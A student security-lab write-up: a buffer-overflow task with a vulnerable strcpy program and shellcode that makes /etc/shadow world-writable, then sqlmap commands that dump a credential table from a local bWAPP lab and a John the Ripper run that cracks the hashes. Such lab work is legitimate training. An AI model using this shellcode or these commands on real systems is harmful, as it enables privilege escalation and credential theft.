# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

Description text (optional)


``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases

**Answer 1**:

To retrieve all the available databases on the target website, we use sqlmap with the argument `--dbs`.

Firts step, we need to determine the valuable parameter to attack. When open the webpage, we were redirected to a login page, let's input a random username and password and check f12 networks to see what the endpoint is

![image](images/image.png)

Alright so our target endpoint is
`http://localhost:3128/unsafe_home.php?username=test&Password=test`

Replace the port 3128 with port 80 since we're executing the command from inside docker. Therefore the command will be

``` 
    sqlmap -u "http://localhost:80/unsafe_home.php?username=test&Password=test" --dbs
```

![image](images/image1.png)

**Question 2**: Use sqlmap to get tables, users information

**Answer 2**:

After we retrieved the available databases (information_schema and sqllab_users), next exploit further the sqllab_users table

``` 
    sqlmap -u "http://localhost:80/unsafe_home.php?username=test&Password=test" -D sqllab_users --tables
    sqlmap -u "http://localhost:80/unsafe_home.php?username=test&Password=test" -D sqllab_users -T credential --dump
```

On output, it can be observed that there's only one table (credential) in the sqllab_users database, and using the second command we can retrieve the full information from the credential table with the password column still being hashed.

![image](images/image2.png)
![image](images/image5.png)

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit

**Answer 3**:

In Answer 2, we already dumpped and stored the hashed password to a separate file for further exploit.

To identity the hash algorithm, we'll use hashid, a library in python.

```
    hashid -mj hash_pw.txt
```

![image](images/image3.png)

Hashid suggest that the encrypt can be crack by using john specifically the format raw-sha1
https://github.com/openwall/john/blob/bleeding-jumbo/doc/INSTALL-UBUNTU
```
    john --format=Raw-SHA1 hash_pw.txt
```

All the passwords have been cracked!

![image](images/image6.png)